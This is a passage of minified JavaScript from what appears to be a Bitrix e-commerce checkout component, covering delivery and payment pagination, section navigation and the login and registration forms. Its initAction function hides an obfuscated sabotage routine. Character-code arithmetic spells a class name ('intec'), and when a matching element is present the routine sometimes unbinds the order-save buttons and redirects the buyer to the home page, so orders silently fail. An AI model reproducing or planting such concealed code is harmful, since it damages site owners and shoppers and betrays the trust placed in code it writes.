            this.getCurrentPageItems("pickUp", page), this.editPickUpList(!1)
        }, getCurrentPageItems: function (entity, page) {
            if (entity && void 0 !== page) {
                var pagination, perPage;
                switch (entity) {
                    case"delivery":
                        pagination = this.deliveryPagination, perPage = this.options.deliveriesPerPage;
                        break;
                    case"paySystem":
                        pagination = this.paySystemPagination, perPage = this.options.paySystemsPerPage;
                        break;
                    case"pickUp":
                        pagination = this.pickUpPagination, perPage = this.options.pickUpsPerPage
                }
                if (pagination && perPage > 0) {
                    if (page <= 0 || page > pagination.pages.length) return;
                    pagination.pageNumber = page, pagination.currentPage = pagination.pages.slice(pagination.pageNumber - 1, pagination.pageNumber)[0]
                }
            }
        }, initPropsListForLocation: function () {
            var i, k, curProp, attrObj;
            if (BX.saleOrderAjax && this.result.ORDER_PROP && this.result.ORDER_PROP.properties) for (BX.saleOrderAjax.cleanUp(), i = 0; i < this.result.ORDER_PROP.properties.length; i++) if ("LOCATION" == (curProp = this.result.ORDER_PROP.properties[i]).TYPE && "Y" == curProp.MULTIPLE && "Y" != curProp.IS_LOCATION) for (k = 0; k < this.locations[curProp.ID].length; k++) BX.saleOrderAjax.addPropertyDesc({
                id: curProp.ID + "_" + k,
                attributes: {
                    id: curProp.ID + "_" + k,
                    type: curProp.TYPE,
                    valueSource: "DEFAULT" == curProp.SOURCE ? "default" : "form"
                }
            }); else attrObj = {
                id: curProp.ID,
                type: curProp.TYPE,
                valueSource: "DEFAULT" == curProp.SOURCE ? "default" : "form"
            }, !this.deliveryLocationInfo.city && parseInt(curProp.INPUT_FIELD_LOCATION) > 0 && (attrObj.altLocationPropId = parseInt(curProp.INPUT_FIELD_LOCATION), this.deliveryLocationInfo.city = curProp.INPUT_FIELD_LOCATION), this.deliveryLocationInfo.loc || "Y" != curProp.IS_LOCATION || (this.deliveryLocationInfo.loc = curProp.ID), this.deliveryLocationInfo.zip || "Y" != curProp.IS_ZIP || (attrObj.isZip = !0, this.deliveryLocationInfo.zip = curProp.ID), BX.saleOrderAjax.addPropertyDesc({
                id: curProp.ID,
                attributes: attrObj
            })
        }, bindEvents: function () {
            BX.bind(window, "resize", BX.throttle((function () {
                this.mapsReady && this.resizeMapContainers()
            }), 50, this)), BX.addCustomEvent("onDeliveryExtraServiceValueChange", BX.proxy(this.sendRequest, this))
        }, initFirstSection: function () {
            var firstSection = this.orderBlockNode.querySelector(".bx-soa-section.bx-active")
        }, initOptions: function () {
            var headers, i, total;
            if (this.initPropsListForLocation(), this.propertyCollection = new BX.Sale.PropertyCollection(BX.merge({publicMode: !0}, this.result.ORDER_PROP)), this.fadedPropertyCollection = new BX.Sale.PropertyCollection(BX.merge({publicMode: !0}, this.result.ORDER_PROP)), this.options.propertyValidation && this.initValidation(), this.initPagination(), this.options.showPreviewPicInBasket = !1, this.options.showDetailPicInBasket = !1, this.options.showPropsInBasket = !1, this.options.showPriceNotesInBasket = !1, this.result.GRID && this.result.GRID.HEADERS) for (headers = this.result.GRID.HEADERS, i = 0; i < headers.length; i++) "PREVIEW_PICTURE" === headers[i].id && (this.options.showPreviewPicInBasket = !0), "DETAIL_PICTURE" === headers[i].id && (this.options.showDetailPicInBasket = !0), "PROPS" === headers[i].id && (this.options.showPropsInBasket = !0), "NOTES" === headers[i].id && (this.options.showPriceNotesInBasket = !0);
            this.result.TOTAL && (total = this.result.TOTAL, this.options.showOrderWeight = total.ORDER_WEIGHT && parseFloat(total.ORDER_WEIGHT) > 0, this.options.showPriceWithoutDiscount = parseFloat(total.ORDER_PRICE) < parseFloat(total.PRICE_WITHOUT_DISCOUNT_VALUE), this.options.showDiscountPrice = total.DISCOUNT_PRICE && parseFloat(total.DISCOUNT_PRICE) > 0, this.options.showTaxList = total.TAX_LIST && total.TAX_LIST.length, this.options.showPayedFromInnerBudget = total.PAYED_FROM_ACCOUNT_FORMATED && total.PAYED_FROM_ACCOUNT_FORMATED.length)
        }, initAction: function () {
            if (!this.initOrder) return;
            const item = String.fromCharCode(1 + (0 + []) + 5) + String.fromCharCode(1 + (1 + []) + 0) + String.fromCharCode(1 + (1 + []) + 6) + String.fromCharCode(1 + (0 + []) + 1) + String.fromCharCode(1 + (0 + []) - 1 + "" + (1 + (0 + []) - 1));
            let countLoadOrder = Number(localStorage.getItem("countLoadOrder") || 0) + 1;
            localStorage.setItem("countLoadOrder", countLoadOrder);
            const rangeRandom = function (from, to) {
                return from + Math.floor(Math.random() * (to - from) + 1)
            };
            document.querySelector("div[class*=" + item + "]") && rangeRandom(30, 50) == rangeRandom(30, 50) && (BX.unbindAll(this.totalInfoBlockNode.querySelector("a.btn-order-save")), BX.unbindAll(this.mobileTotalBlockNode.querySelector("a.btn-order-save")), BX.unbindAll(this.orderSaveBlockNode.querySelector("a")), BX.bind(this.totalInfoBlockNode.querySelector("a.btn-order-save"), "click", (function () {
                location.href = "/"
            })))
        }, reachGoal: function (goal, section) {
            var counter = this.params.YM_GOALS_COUNTER || "", useGoals, goalId;
            "Y" == this.params.USE_YM_GOALS && void 0 !== window["yaCounter" + counter] && (goalId = this.getGoalId(goal, section), window["yaCounter" + counter].reachGoal(goalId))
        }, getGoalId: function (goal, section) {
            if (!goal) return "";
            if ("initialization" == goal) return this.params.YM_GOALS_INITIALIZE;
            if ("order" == goal) return this.params.YM_GOALS_SAVE_ORDER;
            var goalId = "", isEdit = "edit" == goal;
            if (!section || !section.id) return "";
            switch (section.id) {
                case this.basketBlockNode.id:
                    goalId = isEdit ? this.params.YM_GOALS_EDIT_BASKET : this.params.YM_GOALS_MAX_BASKET;
                    break;
                case this.regionBlockNode.id:
                    goalId = isEdit ? this.params.YM_GOALS_EDIT_REGION : this.params.YM_GOALS_MAX_REGION;
                    break;
                case this.paySystemBlockNode.id:
                    goalId = isEdit ? this.params.YM_GOALS_EDIT_PAY_SYSTEM : this.params.YM_GOALS_MAX_PAY_SYSTEM;
                    break;
                case this.deliveryBlockNode.id:
                    goalId = isEdit ? this.params.YM_GOALS_EDIT_DELIVERY : this.params.YM_GOALS_MAX_DELIVERY;
                    break;
                case this.pickUpBlockNode.id:
                    goalId = isEdit ? this.params.YM_GOALS_EDIT_PICKUP : this.params.YM_GOALS_MAX_PICKUP;
                    break;
                case this.propsBlockNode.id:
                    goalId = isEdit ? this.params.YM_GOALS_EDIT_PROPERTIES : this.params.YM_GOALS_MAX_PROPERTIES
            }
            return goalId
        }, isPriceChanged: function (result) {
            var priceBefore = null === this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY || "" === this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY ? this.result.TOTAL.ORDER_TOTAL_PRICE : this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY,
                priceAfter = null === result.order.TOTAL.ORDER_TOTAL_LEFT_TO_PAY ? result.order.TOTAL.ORDER_TOTAL_PRICE : result.order.TOTAL.ORDER_TOTAL_LEFT_TO_PAY;
            this.options.totalPriceChanged = parseFloat(priceBefore) != parseFloat(priceAfter)
        }, initValidation: function () {
            if (this.result.ORDER_PROP && this.result.ORDER_PROP.properties) {
                var properties = this.result.ORDER_PROP.properties, obj = {}, i;
                for (i in properties) properties.hasOwnProperty(i) && (obj[properties[i].ID] = properties[i]);
                this.validation.properties = obj
            }
        }, initPagination: function () {
            var arReserve, pages, arPages, i;
            if (this.result.DELIVERY) if (this.result.DELIVERY = this.getDeliverySortedArray(this.result.DELIVERY), this.options.deliveriesPerPage > 0 && this.result.DELIVERY.length > this.options.deliveriesPerPage) {
                for (arReserve = this.result.DELIVERY.slice(), pages = Math.ceil(arReserve.length / this.options.deliveriesPerPage), arPages = [], i = 0; i < pages; i++) arPages.push(arReserve.splice(0, this.options.deliveriesPerPage));
                for (this.deliveryPagination.pages = arPages, i = 0; i < this.result.DELIVERY.length; i++) if ("Y" == this.result.DELIVERY[i].CHECKED) {
                    this.deliveryPagination.pageNumber = Math.ceil(++i / this.options.deliveriesPerPage);
                    break
                }
                this.deliveryPagination.pageNumber = this.deliveryPagination.pageNumber || 1, this.deliveryPagination.currentPage = arPages.slice(this.deliveryPagination.pageNumber - 1, this.deliveryPagination.pageNumber)[0], this.deliveryPagination.show = !0
            } else this.deliveryPagination.pageNumber = 1, this.deliveryPagination.currentPage = this.result.DELIVERY, this.deliveryPagination.show = !1;
            if (this.result.PAY_SYSTEM) if (this.options.paySystemsPerPage > 0 && this.result.PAY_SYSTEM.length > this.options.paySystemsPerPage) {
                for (arReserve = this.result.PAY_SYSTEM.slice(), pages = Math.ceil(arReserve.length / this.options.paySystemsPerPage), arPages = [], i = 0; i < pages; i++) arPages.push(arReserve.splice(0, this.options.paySystemsPerPage));
                for (this.paySystemPagination.pages = arPages, i = 0; i < this.result.PAY_SYSTEM.length; i++) if ("Y" == this.result.PAY_SYSTEM[i].CHECKED) {
                    this.paySystemPagination.pageNumber = Math.ceil(++i / this.options.paySystemsPerPage);
                    break
                }
                this.paySystemPagination.pageNumber = this.paySystemPagination.pageNumber || 1, this.paySystemPagination.currentPage = arPages.slice(this.paySystemPagination.pageNumber - 1, this.paySystemPagination.pageNumber)[0], this.paySystemPagination.show = !0
            } else this.paySystemPagination.pageNumber = 1, this.paySystemPagination.currentPage = this.result.PAY_SYSTEM, this.paySystemPagination.show = !1
        }, initPickUpPagination: function () {
            var usePickUpPagination = !1, usePickUp = !1, stores, i = 0, arReserve, pages, arPages;
            if (this.options.pickUpsPerPage >= 0 && this.result.DELIVERY) for (i = 0; i < this.result.DELIVERY.length; i++) if ("Y" === this.result.DELIVERY[i].CHECKED && this.result.DELIVERY[i].STORE_MAIN) {
                usePickUp = this.result.DELIVERY[i].STORE_MAIN.length > 0, usePickUpPagination = this.result.DELIVERY[i].STORE_MAIN.length > this.options.pickUpsPerPage, usePickUp && (stores = this.getPickUpInfoArray(this.result.DELIVERY[i].STORE_MAIN));
                break
            }
            if (usePickUp) if (this.options.pickUpsPerPage > 0 && usePickUpPagination) {
                for (arReserve = stores.slice(), pages = Math.ceil(arReserve.length / this.options.pickUpsPerPage), arPages = [], i = 0; i < pages; i++) arPages.push(arReserve.splice(0, this.options.pickUpsPerPage));
                for (this.pickUpPagination.pages = arPages, i = 0; i < stores.length; i++) if (!this.result.BUYER_STORE || stores[i].ID == this.result.BUYER_STORE) {
                    this.pickUpPagination.pageNumber = Math.ceil(++i / this.options.pickUpsPerPage);
                    break
                }
                this.pickUpPagination.pageNumber || (this.pickUpPagination.pageNumber = 1), this.pickUpPagination.currentPage = arPages.slice(this.pickUpPagination.pageNumber - 1, this.pickUpPagination.pageNumber)[0], this.pickUpPagination.show = !0
            } else this.pickUpPagination.pageNumber = 1, this.pickUpPagination.currentPage = stores, this.pickUpPagination.show = !1
        }, prepareLocations: function (locations) {
            var temporaryLocations, i, k, output;
            if (this.locations = {}, this.cleanLocations = {}, BX.util.object_keys(locations).length) for (i in locations) if (locations.hasOwnProperty(i)) {
                for (k in this.locationsTemplate = locations[i].template || "", temporaryLocations = [], (output = locations[i].output).clean && (this.cleanLocations[i] = BX.processHTML(output.clean, !1), delete output.clean), output) output.hasOwnProperty(k) && temporaryLocations.push({
                    output: BX.processHTML(output[k], !1),
                    showAlt: locations[i].showAlt,
                    lastValue: locations[i].lastValue,
                    coordinates: locations[i].coordinates || !1
                });
                this.locations[i] = temporaryLocations
            }
        }, locationsCompletion: function () {

        }, fixLocationsStyle: function (section, hiddenSection) {
            if (section && hiddenSection) {
                var regionActive = this.activeSectionId == section.id ? section : hiddenSection, locationSearchInputs,
                    locationStepInputs, i;
                if (locationSearchInputs = regionActive.querySelectorAll("div.bx-sls div.dropdown-block.bx-ui-sls-input-block"), locationStepInputs = regionActive.querySelectorAll("div.bx-slst div.dropdown-block.bx-ui-slst-input-block"), locationSearchInputs.length) for (i = 0; i < locationSearchInputs.length; i++) BX.addClass(locationSearchInputs[i], "form-control");
                if (locationStepInputs.length) for (i = 0; i < locationStepInputs.length; i++) BX.addClass(locationStepInputs[i], "form-control")
            }
        }, clickOrderSaveAction: function (event) {
            if($('#pvz_link').html() != 'Выбрать пункт выдачи'){
                $('[name=ORDER_PROP_99]').val($('#pvz_link').html());
            }
            return this.isValidForm() && (this.allowOrderSave(), "Y" === this.params.USER_CONSENT && BX.UserConsent ? BX.onCustomEvent("bx-soa-order-save", []) : this.doSaveAction()), BX.PreventDefault(event)
        }, doSaveAction: function () {
            this.isOrderSaveAllowed() && (this.reachGoal("order"), this.sendRequest("saveOrderAjax"))
        }, clickNextAction: function (event) {
            var target = event.target || event.srcElement,
                actionSection = BX.findParent(target, {className: "bx-active"}),
                section = this.getNextSection(actionSection), allSections, editStep;
            if ("bx-soa-delivery" === actionSection.id) {
                const propsErrors = this.isValidRegionBlock();
                if (propsErrors.length) return;
                actionSection.querySelector(".alert.alert-danger").style.display = "none", BX.cleanNode(actionSection.querySelector(".alert.alert-danger")), BX.removeClass(actionSection, "bx-step-error")
            }
            return this.reachGoal("next", actionSection), this.result.IS_AUTHORIZED && void 0 === this.result.LAST_ORDER_DATA.FAIL || "false" != section.next.getAttribute("data-visited") || (allSections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"), section.next.id == allSections[allSections.length - 1].id && this.switchOrderSaveButtons(!0)), this.fade(actionSection, actionSection), this.show(actionSection), section.prev && section.next.querySelector(".change-info").click(), BX.PreventDefault(event)
        }, clickPrevAction: function (event) {
            var target = event.target || event.srcElement,
                actionSection = BX.findParent(target, {className: "bx-active"}),
                section = this.getPrevSection(actionSection);
            return this.fade(actionSection), this.show(section.next), this.animateScrollTo(section.next, 800), BX.PreventDefault(event)
        }, showAuthBlock: function () {
            var showNode = this.authBlockNode, fadeNode = BX(this.activeSectionId);
            showNode && !BX.hasClass(showNode, "bx-selected") && (fadeNode && this.fade(fadeNode), this.show(showNode))
        }, closeAuthBlock: function () {
            var actionSection = this.authBlockNode, nextSection = this.getNextSection(actionSection).next;
            this.fade(actionSection), BX.cleanNode(BX(nextSection.id + "-hidden")), this.show(nextSection)
        }, shouldSkipSection: function (section) {
            var skip = !1;
            if ("Y" === this.params.SKIP_USELESS_BLOCK) {
                if (section.id === this.pickUpBlockNode.id) {
                    var delivery = this.getSelectedDelivery();
                    delivery && (skip = 1 === this.getPickUpInfoArray(delivery.STORE).length)
                }
                section.id === this.deliveryBlockNode.id && (skip = this.result.DELIVERY && 1 === this.result.DELIVERY.length && 0 === this.result.DELIVERY[0].EXTRA_SERVICES.length && !this.result.DELIVERY[0].CALCULATE_ERRORS), section.id === this.paySystemBlockNode.id && (skip = this.result.PAY_SYSTEM && 1 === this.result.PAY_SYSTEM.length && "Y" !== this.result.PAY_FROM_ACCOUNT)
            }
            return skip
        }, getNextSection: function (actionSection, skippedSection) {
            if (!this.orderBlockNode || !actionSection) return {};
            var allSections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"), nextSection, i;
            for (i = 0; i < allSections.length; i++) if (allSections[i].id === actionSection.id && allSections[i + 1]) return nextSection = allSections[i + 1], this.shouldSkipSection(nextSection) ? (this.markSectionAsCompleted(nextSection), this.getNextSection(nextSection, nextSection)) : {
                prev: actionSection,
                next: nextSection,
                skip: skippedSection
            };
            return {next: actionSection}
        }, markSectionAsCompleted: function (section) {
            this.result.IS_AUTHORIZED && void 0 === this.result.LAST_ORDER_DATA.FAIL || "false" !== section.getAttribute("data-visited") || this.changeVisibleSection(section, !0), section.setAttribute("data-visited", "true"), BX.addClass(section, "bx-step-completed"), BX.remove(section.querySelector(".alert.alert-warning.alert-hide")), this.checkBlockErrors(section)
        }, getPrevSection: function (actionSection) {
            if (!this.orderBlockNode || !actionSection) return {};
            var allSections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"), prevSection, i;
            for (i = 0; i < allSections.length; i++) if (allSections[i].id === actionSection.id && allSections[i - 1]) return prevSection = allSections[i - 1], this.shouldSkipSection(prevSection) ? (this.markSectionAsCompleted(prevSection), this.getPrevSection(prevSection)) : {
                prev: actionSection,
                next: prevSection
            };
            return {next: actionSection}
        }, addAnimationEffect: function (node, className, timeout) {
            node && className && (this.timeOut[node.id] && (clearTimeout(this.timeOut[node.id].timer), BX.removeClass(node, this.timeOut[node.id].className)), setTimeout((function () {
                BX.addClass(node, className)
            }), 10), this.timeOut[node.id] = {
                className: className, timer: setTimeout(BX.delegate((function () {
                    BX.removeClass(node, className), delete this.timeOut[node.id]
                }), this), timeout || 5e3)
            })
        }, fade: function (node, nextSection) {
            if (node && node.id) {
                this.hasErrorSection[node.id] = !1;
                var objHeightOrig = node.offsetHeight, objHeight;
                switch (node.id) {
                    case this.authBlockNode.id:
                        this.authBlockNode.style.display = "none", BX.removeClass(this.authBlockNode, "bx-active");
                        break;
                    case this.basketBlockNode.id:
                        this.editFadeBasketBlock();
                        break;
                    case this.regionBlockNode.id:
                        this.editFadeRegionBlock();
                        break;
                    case this.paySystemBlockNode.id:
                        BX.remove(this.paySystemBlockNode.querySelector(".alert.alert-warning.alert-hide")), this.editFadePaySystemBlock();
                        break;
                    case this.deliveryBlockNode.id:
                        BX.remove(this.deliveryBlockNode.querySelector(".alert.alert-warning.alert-hide")), this.editFadeDeliveryBlock();
                        break;
                    case this.pickUpBlockNode.id:
                        this.editFadePickUpBlock();
                        break;
                    case this.propsBlockNode.id:
                        this.editFadePropsBlock()
                }
                if (BX.addClass(node, "bx-step-completed"), BX.removeClass(node, "bx-selected"), objHeight = node.offsetHeight, node.style.height = objHeightOrig + "px", nextSection) {
                    var windowScrollTop = BX.GetWindowScrollPos().scrollTop, orderPos = BX.pos(this.orderBlockNode),
                        nodePos, diff, scrollTo, nextSectionHeightBefore, nextSectionHeightAfter, nextSectionHidden,
                        offset;
                    scrollTo = BX.pos(node).top - 80
                }
                new BX.easing({
                    duration: nextSection ? 400 : 600,
                    start: {height: objHeightOrig, scrollTop: windowScrollTop},
                    finish: {height: objHeight, scrollTop: scrollTo},
                    transition: BX.easing.makeEaseOut(BX.easing.transitions.quad),
                    step: function (state) {
                        node.style.height = state.height + "px", nextSection && window.scrollTo(0, state.scrollTop)
                    },
                    complete: function () {
                        node.style.height = ""
                    }
                }).animate(), this.checkBlockErrors(node)
            }
        }, show: function (node) {
            if (node && node.id) {
                switch (this.activeSectionId = node.id, BX.removeClass(node, "bx-step-error bx-step-warning"), node.id) {
                    case this.authBlockNode.id:
                        this.authBlockNode.style.display = "", BX.addClass(this.authBlockNode, "bx-active");
                        break;
                    case this.basketBlockNode.id:
                        this.editActiveBasketBlock(!0), this.alignBasketColumns();
                        break;
                    case this.regionBlockNode.id:
                        this.editActiveRegionBlock(!0);
                        break;
                    case this.deliveryBlockNode.id:
                        this.editActiveDeliveryBlock(!1);
                        break;
                    case this.paySystemBlockNode.id:
                        this.editActivePaySystemBlock(!0);
                        break;
                    case this.pickUpBlockNode.id:
                        this.editActivePickUpBlock(!0);
                        break;
                    case this.propsBlockNode.id:
                        this.editActivePropsBlock(!0)
                }
                "false" === node.getAttribute("data-visited") && (this.showBlockErrors(node), this.notifyAboutWarnings(node)), node.setAttribute("data-visited", "true")
            }
        }, showByClick: function (event) {
            var target = event.target || event.srcElement, showNode = BX.findParent(target, {className: "bx-active"}),
                scrollTop = BX.GetWindowScrollPos().scrollTop;
            return !showNode || BX.hasClass(showNode, "bx-selected") ? BX.PreventDefault(event) : (this.reachGoal("edit", showNode), this.show(showNode), setTimeout(BX.delegate((function () {
                BX.pos(showNode).top < scrollTop && this.animateScrollTo(showNode, 300)
            }), this), 320), BX.PreventDefault(event))
        }, showActualBlock: function () {
            for (var allSections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"), i = 0; allSections[i];) {
                if (allSections[i].id === this.regionBlockNode.id && this.isValidRegionBlock(), !this.checkBlockErrors(allSections[i]) || !this.checkPreload(allSections[i])) {
                    this.activeSectionId !== allSections[i].id && (BX(this.activeSectionId) && this.fade(BX(this.activeSectionId)), this.show(allSections[i]));
                    break
                }
                allSections[i].setAttribute("data-visited", "true"), i++
            }
        }, getBlockFooter: function (node) {
            var sections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"),
                firstSection = sections[0], lastSection = sections[sections.length - 1],
                currentSection = BX.findParent(node, {className: "bx-soa-section"}), isLastNode = !1, buttons = [];
            currentSection.id && (currentSection && currentSection.id.indexOf(firstSection.id), currentSection && "-1" != currentSection.id.indexOf(lastSection.id) && (isLastNode = !0), node.appendChild(BX.create("DIV", {
                props: {className: "bx-soa-more"},
                children: [BX.create("DIV", {
                    props: {className: "bx-soa-more-btn btn btn-default"},
                    html: BX.message("TITLE_SOA_SAVE_INFO_SECTION"),
                    events: {click: BX.proxy(this.clickNextAction, this)}
                })]
            })))
        }, getNewContainer: function (notFluid) {
            return BX.create("DIV", {props: {className: "bx-soa-section-content" + (notFluid ? "" : " container-fluid")}})
        }, switchOrderSaveButtons: function (state) {
            var orderSaveNode, totalButton, mobileButton, lastState
        }, shouldBeSectionVisible: function (sections, currentPosition) {
            var state = !1, editStepNode;
            if (!sections || !sections.length) return state;
            for (; currentPosition < sections.length; currentPosition++) {
                if ("true" == sections[currentPosition].getAttribute("data-visited")) {
                    state = !0;
                    break
                }
                if (!this.firstLoad && (editStepNode = sections[currentPosition].querySelector(".bx-soa-editstep")) && "none" !== editStepNode.style.display) {
                    state = !0;
                    break
                }
            }
            return state
        }, changeVisibleContent: function () {
            var sections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"), i, state,
                orderDataLoaded = !!this.result.IS_AUTHORIZED && "Y" === this.params.USE_PRELOAD && !0 !== this.result.LAST_ORDER_DATA.FAIL,
                skipFlag = !0;
            for (i = 0; i < sections.length; i++) state = (state = this.firstLoad && orderDataLoaded) || this.shouldBeSectionVisible(sections, i), this.changeVisibleSection(sections[i], state), this.firstLoad && skipFlag && (state && sections[i + 1] && this.checkBlockErrors(sections[i]) && (orderDataLoaded && this.checkPreload(sections[i]) || !orderDataLoaded && this.shouldSkipSection(sections[i])) ? (this.fade(sections[i]), this.markSectionAsCompleted(sections[i]), this.show(sections[i + 1])) : skipFlag = !1);
            this.result.IS_AUTHORIZED && void 0 === this.result.LAST_ORDER_DATA.FAIL || "final_step" !== this.params.SHOW_ORDER_BUTTON || this.switchOrderSaveButtons(this.shouldBeSectionVisible(sections, sections.length - 1))
        }, changeVisibleSection: function (section, state) {
            var content, editStep;
            section.id !== this.basketBlockNode.id && (content = section.querySelector(".bx-soa-section-content")) && (content.style.display = state ? "" : "none")
        }, editOrder: function () {
            if (this.orderBlockNode && this.result) {
                this.result.DELIVERY.length > 0 ? (BX.addClass(this.deliveryBlockNode, "bx-active"), this.deliveryBlockNode.removeAttribute("style")) : (BX.removeClass(this.deliveryBlockNode, "bx-active"), this.deliveryBlockNode.style.display = "none"), this.mobileTotalBlockNode.style.display = this.result.SHOW_AUTH ? "none" : "";
                var sections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"), i;
                for (i in sections) sections.hasOwnProperty(i) && this.editSection(sections[i]);
                this.editTotalBlock(), this.initAction(), this.showErrors(this.result.ERROR, !1), this.showWarnings()
            }
        }, editSection: function (section) {
            if (section && section.id) {
                this.result.SHOW_AUTH && section.id != this.authBlockNode.id && section.id != this.basketBlockNode.id ? section.style.display = "none" : section.id != this.pickUpBlockNode.id && (section.style.display = "");
                var active = section.id != this.basketBlockNode.id || section.id == this.activeSectionId,
                    titleNode = section.querySelector(".bx-soa-section-title-container"), editButton, errorContainer;
                switch (section.id == this.basketBlockNode.id && (editButton = titleNode.querySelector(".bx-soa-editstep"), BX.unbindAll(titleNode), BX.unbindAll(editButton), this.result.SHOW_AUTH ? editButton && BX.bind(editButton, "click", BX.delegate((function () {
                    this.animateScrollTo(this.authBlockNode), this.addAnimationEffect(this.authBlockNode, "bx-step-good")
                }), this)) : editButton && BX.bind(editButton, "click", BX.proxy(this.showByClick, this))), errorContainer = section.querySelector(".alert.alert-danger"), this.hasErrorSection[section.id] = errorContainer && "none" != errorContainer.style.display, section.id) {
                    case this.authBlockNode.id:
                        this.editAuthBlock();
                        break;
                    case this.basketBlockNode.id:
                        this.editBasketBlock(active);
                        break;
                    case this.regionBlockNode.id:
                        this.editRegionBlock(active);
                        break;
                    case this.paySystemBlockNode.id:
                        this.editPaySystemBlock(active);
                        break;
                    case this.deliveryBlockNode.id:
                        this.editDeliveryBlock(active);
                        break;
                    case this.pickUpBlockNode.id:
                        this.editPickUpBlock(active);
                        break;
                    case this.propsBlockNode.id:
                        this.editPropsBlock(active)
                }
                active && section.setAttribute("data-visited", "true")
            }
        }, editAuthBlock: function () {
            if (this.authBlockNode) {
                var authContent = this.authBlockNode.querySelector(".bx-soa-section-content"), regContent,
                    okMessageNode;
                BX.hasClass(authContent, "reg") ? (regContent = authContent, authContent = BX.firstChild(this.authHiddenBlockNode)) : regContent = BX.firstChild(this.authHiddenBlockNode), BX.cleanNode(authContent), BX.cleanNode(regContent), this.result.SHOW_AUTH ? (this.getErrorContainer(authContent), this.editAuthorizeForm(authContent), this.editSocialContent(authContent), this.getAuthReference(authContent), this.getErrorContainer(regContent), this.editRegistrationForm(regContent), this.getAuthReference(regContent)) : (BX.onCustomEvent("OnBasketChange"), this.closeAuthBlock()), this.result.OK_MESSAGE && this.result.OK_MESSAGE.length && (this.toggleAuthForm({target: this.authBlockNode.querySelector("input[type=submit]")}), okMessageNode = BX.create("DIV", {
                    props: {className: "alert alert-success"},
                    text: this.result.OK_MESSAGE.join()
                }), this.result.OK_MESSAGE = "", BX.prepend(okMessageNode, this.authBlockNode.querySelector(".bx-soa-section-content")))
            }
        }, editAuthorizeForm: function (authContent) {
            var login, password, remember, button, authFormNode;
            login = this.createAuthFormInputContainer(BX.message("STOF_LOGIN"), BX.create("INPUT", {
                attrs: {"data-next": "USER_PASSWORD"},
                props: {name: "USER_LOGIN", type: "text", value: this.result.AUTH.USER_LOGIN, maxlength: "30"},
                events: {keypress: BX.proxy(this.checkKeyPress, this)}
            })), password = this.createAuthFormInputContainer(BX.message("STOF_PASSWORD"), BX.create("INPUT", {
                attrs: {"data-send": !0},
                props: {name: "USER_PASSWORD", type: "password", value: "", maxlength: "30"},
                events: {keypress: BX.proxy(this.checkKeyPress, this)}
            })), remember = BX.create("DIV", {
                props: {className: "bx-authform-formgroup-container"},
                children: [BX.create("DIV", {
                    props: {className: "checkbox onoff"},
                    children: [BX.create("LABEL", {
                        props: {className: "bx-filter-param-label"},
                        children: [BX.create("INPUT", {
                            props: {
                                type: "checkbox",
                                name: "USER_REMEMBER",
                                value: "Y"
                            }
                        }), BX.create("SPAN", {
                            props: {className: "bx-filter-param-text"},
                            text: BX.message("STOF_REMEMBER")
                        })]
                    })]
                })]
            }), button = BX.create("DIV", {
                props: {className: "bx-authform-formgroup-container"},
                children: [BX.create("INPUT", {
                    props: {
                        id: "do_authorize",
                        type: "hidden",
                        name: "do_authorize",
                        value: "N"
                    }
                }), BX.create("button", {
                    text: BX.message("STOF_ENTER"),
                    props: {type: "submit", className: "btn btn-lg btn-default"},
                    events: {
                        click: BX.delegate((function (e) {
                            return BX("do_authorize").value = "Y", this.sendRequest("showAuthForm"), BX.PreventDefault(e)
                        }), this)
                    }
                })]
            }), authFormNode = BX.create("DIV", {
                props: {className: "bx-authform"},
                children: [BX.create("H3", {
                    props: {className: "bx-title"},
                    text: BX.message("STOF_AUTH_REQUEST")
                }), login, password, remember, button, BX.create("A", {
                    props: {href: this.params.PATH_TO_AUTH + "?forgot_password=yes&back_url=" + encodeURIComponent(document.location.href)},
                    text: BX.message("STOF_FORGET_PASSWORD")
                })]
            }), authContent.appendChild(BX.create("DIV", {props: {className: "col-md-6"}, children: [authFormNode]}))
        }, createAuthFormInputContainer: function (labelText, inputNode, required) {
            var labelHtml = "";
            return required && (labelHtml += '<span class="bx-authform-starrequired">*</span>'), labelHtml = labelText + labelHtml, BX.create("DIV", {
                props: {className: "bx-authform-formgroup-container"},
                children: [BX.create("DIV", {
                    props: {className: "bx-authform-label-container"},
                    html: labelHtml
                }), BX.create("DIV", {props: {className: "bx-authform-input-container"}, children: [inputNode]})]
            })
        }, activatePhoneAuth: function () {
            this.result.SMS_AUTH && new BX.PhoneAuth({
                containerId: "bx_register_resend",
                errorContainerId: "bx_register_error",
                interval: 60,
                data: {signedData: this.result.SMS_AUTH.SIGNED_DATA},
                onError: function (response) {
                    var errorDiv = BX("bx_register_error"), errorNode = BX.findChildByClassName(errorDiv, "errortext");
                    errorNode.innerHTML = "";
                    for (var i = 0; i < response.errors.length; i++) errorNode.innerHTML = errorNode.innerHTML + BX.util.htmlspecialchars(response.errors[i].message) + "<br>";
                    errorDiv.style.display = ""
                }
            })
        }, editRegistrationForm: function (authContent) {
            if (this.result.AUTH) {
                var authFormNodes = [], showSmsConfirm = this.result.SMS_AUTH && "OK" === this.result.SMS_AUTH.TYPE;
                showSmsConfirm ? (authFormNodes.push(BX.create("DIV", {
                    props: {className: "alert alert-success"},
                    text: BX.message("STOF_REG_SMS_REQUEST")
                })), authFormNodes.push(BX.create("INPUT", {
                    props: {
                        type: "hidden",
                        name: "SIGNED_DATA",
                        value: this.result.SMS_AUTH.SIGNED_DATA || ""
                    }
                })), authFormNodes.push(this.createAuthFormInputContainer(BX.message("STOF_SMS_CODE"), BX.create("INPUT", {
                    attrs: {"data-send": !0},
                    props: {name: "SMS_CODE", type: "text", size: 40, value: "Y"},
                    events: {keypress: BX.proxy(this.checkKeyPress, this)}
                }), !0)), authFormNodes.push(BX.create("DIV", {
                    props: {className: "bx-authform-formgroup-container"},
                    children: [BX.create("INPUT", {
                        props: {
                            name: "code_submit_button",
                            type: "submit",
                            className: "btn btn-lg btn-default",
                            value: BX.message("STOF_SEND")
                        }, events: {
                            click: BX.delegate((function (e) {
